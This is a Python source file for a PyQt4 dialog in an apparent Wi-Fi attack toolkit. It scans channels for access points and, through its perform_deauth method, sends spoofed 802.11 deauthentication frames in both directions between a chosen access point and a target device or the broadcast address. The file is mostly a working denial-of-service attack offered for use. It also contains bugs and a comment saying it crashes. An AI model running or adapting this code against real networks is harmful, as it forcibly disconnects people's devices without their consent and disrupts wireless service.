# -*- coding: utf-8 -*-

# Form implementation generated from reading ui file 'uiDA.ui'
#
# Created by: PyQt4 UI code generator 4.11.4
#
# WARNING! All changes made in this file will be lost!

# 802.11 type 0 = Management Frames (Probe, Auth, Associate)
#   802.11 subtype 12 = Deauthentication Frame
#   802.11 subtype 11 = Authentication Frame
#   wlan.fc.type_subtype== 11 && wlan.addr == <MAC> - Wireshark Filter

import thread
import sys
import os
import time
import re
from scapy.all import *
from PyQt4 import QtCore, QtGui

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    def _fromUtf8(s):
        return s
try:
    _encoding = QtGui.QApplication.UnicodeUTF8
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig, _encoding)
except AttributeError:
    def _translate(context, text, disambig):
        return QtGui.QApplication.translate(context, text, disambig)

APs ={}
Outputlist = []
ssidlist = []
bssidlist = []
channellist = []

bssidToChannel = {}
bssidToSsid = {}

#TODO - IMPLEMENT ATTACK EXECUTION
# :)
class uiDA(QtGui.QDialog):
    def __init__(self, ifoi,parent=None):
        super(uiDA, self).__init__(parent)
        #Initilize
        self.interface = ifoi
        print "Passed Interface Name: " + self.interface
        self.Channel = "";
        self.Frequency = None;
        self.initScan();
        self.setupUi(self)
        self.populateInfo()

        #Select current interface
        self.selectedSourceInt = str(self.Source.currentText())
        self.setSourceMacAndChannel(self.selectedSourceInt)

        #Define Onclick actions
        self.Execute.clicked.connect(self.attack)
        self.Scan.clicked.connect(self.initScan)
        self.Close.clicked.connect(self.closeWin)

        #Implementing Signal to update selected interface
        self.Source.currentIndexChanged[str].connect(self.setSourceMacAndChannel)

    def setupUi(self, Dialog):
        Dialog.setObjectName(_fromUtf8("Dialog"))
        Dialog.resize(483, 321)

        self.verticalLayout_2 = QtGui.QVBoxLayout(Dialog)
        self.verticalLayout_2.setObjectName(_fromUtf8("verticalLayout_2"))

        self.srcLabel = QtGui.QLabel(Dialog)
        self.srcLabel.setObjectName(_fromUtf8("srcLabel"))

        self.verticalLayout_2.addWidget(self.srcLabel)

        #DropDOwn for Source
        self.Source = QtGui.QComboBox(Dialog)
        self.Source.setObjectName(_fromUtf8("Source"))
        self.verticalLayout_2.addWidget(self.Source)

        self.trgtlabel = QtGui.QLabel(Dialog)
        self.trgtlabel.setObjectName(_fromUtf8("trgtlabel"))

        self.verticalLayout_2.addWidget(self.trgtlabel)

        #Drop Down for Target
        self.Target = QtGui.QLineEdit(Dialog)
        self.Target.setObjectName(_fromUtf8("Target"))
        self.Target.setFixedHeight(25)
        self.Target.setMaxLength(17)
        self.verticalLayout_2.addWidget(self.Target)

        self.Scan= QtGui.QPushButton(Dialog)
        self.Scan.setObjectName(_fromUtf8("Scan"))
        self.Scan.setEnabled(False)
        self.verticalLayout_2.addWidget(self.Scan)

        self.Execute = QtGui.QPushButton(Dialog)
        self.Execute.setObjectName(_fromUtf8("Execute"))
        self.verticalLayout_2.addWidget(self.Execute)

        self.Output = QtGui.QTextBrowser(Dialog)
        self.Output.setObjectName(_fromUtf8("Output"))

        self.verticalLayout_2.addWidget(self.Output)

        self.Close = QtGui.QPushButton(Dialog)
        self.Close.setObjectName(_fromUtf8("Close"))

        self.verticalLayout_2.addWidget(self.Close)

        self.retranslateUi(Dialog)

        QtCore.QMetaObject.connectSlotsByName(Dialog)

    #This method handles the textc content for the Widgets
    def retranslateUi(self, Dialog):
        Dialog.setWindowTitle(_translate("Dialog", "WAT | deAuthentication Attack", None))
        self.srcLabel.setText(_translate("Dialog", "Source BSSID:", None))
        self.trgtlabel.setText(_translate("Dialog", "Target MAC Address:", None))
        self.Execute.setText(_translate("Dialog", "Execute", None))
        self.Scan.setText(_translate("Dialog", "Scan For APs", None))
        self.Close.setText(_translate("Dialog", "Close", None))

    def populateInfo(self):
        i = 0
        print "BSSID: \t\t\t\t\tCH:\tSSID:"
        while i < len(Outputlist):
            try:
                ssid = Outputlist[i]
                bssid = Outputlist[i+1]
                channel = Outputlist[i+2]

                bssidToChannel[bssid] = channel
                bssidToSsid[bssid] = ssid

                ssidlist.append(Outputlist[i])
                bssidlist.append(Outputlist[i+1])
                channellist.append(Outputlist[i+2])
            except:
                pass
            i += 3
            print bssid +"\t\t" + channel + "\t" + ssid

        print "---------"
        print "Number of BSSIDs:", len(bssidlist)

        #Validating SSID -> BSSID -> Channel match up
        for k,v in bssidToChannel.items():
            print k
            self.Source.addItem(str(k))
        print "----"
        for k in bssidToSsid.items():
            print k 

    def initScan(self):
        i = 1
        while i <=11:
            subprocess.check_output(['iwconfig '+ self.interface + ' channel ' + str(i)], shell=True)
            sniff(iface=self.interface, prn=self.sniffAP,timeout=0.3)
            i += 1

    def setSourceMacAndChannel(self, selected_source):
        self.selectedSourceInt = str(selected_source)  #Making focused Comboboxitem the selected item
        for k, v in bssidToSsid.items():
            if str(selected_source) in k:
                self.srcLabel.setText("Source BSSID: " + v) #Setting Top Label to New SSID
                print "------------------//"
                print "Selected egress Interface: " + self.interface
                print "Selected SSID: " + v
                print "Selected BSSID: " + k
                self.Output.setText(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">Selected SSID: </span>", None) + v)
                self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">Selected BSSID: </span>", None) + k)

        for k, v in bssidToChannel.items():
            if(str(selected_source) in k):
                self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">BSSIDs Channel: </span>", None) + v)
                self.Channel = v
                print "Selected BSSID Channel: " + v
                
    def setChannel(self, chNumber):
        try:
            subprocess.check_output(['iwconfig ' + self.interface + ' channel ' + str(chNumber)], shell=True)
            output = subprocess.check_output(['iwlist ' + self.interface + ' channel| egrep "Current"|sed s/" "//g'], shell=True)
            self.Frequency = output
        except error:
            print "[+] Could change Channel number...", error
            self.Output.append(_translate("self", "<span style =\"color:#ff000000; font-weight: bold;\">[Error]:</span> Could not set Channel number..." , None) + v)
        print output

    def sniffAP(self, packet): #Can be optimized - for faster execution?
        if((packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp))
            and not APs.has_key(packet[Dot11].addr3)):
            ssid = packet[Dot11Elt].info
            bssid = packet[Dot11].addr3
            channel = str(int(ord(packet[Dot11Elt:3].info)))

            if ssid == "\x00": #\x00 truncated```    
                ssid = "<Hidden>"

            if(str(packet[Dot11].addr3) not in Outputlist):
                Outputlist.append(ssid)
                Outputlist.append(bssid)
                Outputlist.append(channel)
            
            APs[ssid] = bssid

    def Scan(self):
        self.initScan()
        self.populateInfo
 
    def attack(self):
        self.Output.setText('')
        print "Target:", self.Target.text()
        print "Source:", self.Source.currentText()
        print "Channel:", self.Channel

        prog = re.search("[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}:[a-zA-Z0-9]{2}", self.Target.text())
        print bool(prog)

        if (self.Target.text() == "" or not prog):
            self.Output.setText(_translate("self", '<span style=\"color:#ff0000; font-weight: bold;\">[Error]</span> - Please input a valid MAC address...', None))
        else:
            try:
                self.setChannel(self.Channel)
                thread.start_new_thread(self.perform_deauth, (str(self.Source.currentText()), str(self.Target.text()), 30))
                print "Scanning"
            except error:
                print "Failed to Initiate Scan" + error

        # f8:a9:d0:67:82:55 - My Android Phone
        # c0:a0:bb:f5:c0:84 - DLink APs BSSID
        # 00:37:B7:F5:47:8C

    def perform_deauth(self, bssid, client, count):

        self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">[+]</span> Creating 802.11 Deauthentication Frames...",None))

        pckt = Dot11(addr1=client, addr2=bssid, addr3=bssid) / Dot11Deauth()
        cli_to_ap_pckt = None

        if client != 'FF:FF:FF:FF:FF:FF' :
            cli_to_ap_pckt = Dot11(addr1=bssid, addr2=client, addr3=bssid) / Dot11Deauth()

        self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">[+]</span> Sending Deauth Frames to ", None) + client + " as " + bssid)
        #Will send bursts of packets (32 packets)
        for i in range(count):
            # Send out deauth from the AP
            send(pckt)
            # If we're targeting a client, we will also spoof deauth from the client to the AP
            if client != 'FF:FF:FF:FF:FF:FF':
                send(cli_to_ap_pckt)
        
        self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">Current Channel: </span>", None) + self.Frequency)
        self.Output.append(_translate("self", "<span style =\"color:#218cff; font-weight: bold;\">[Complete]: </span>",None) + str(count) + " frames sent...")

        #CRASHES AFTER EXECUTION COMPLETION

    def closeWin(self):
        print "[+] Closing WEP attack..."
        self.close()



#Optimization - Use QThread to run attack and Scan
class worker(QtCore.QThread):
    def __init__(self, Parent=None):
        super(worker, self).__init__parent

    def __del__():
        print "lol"

    def run():
        print "lol"
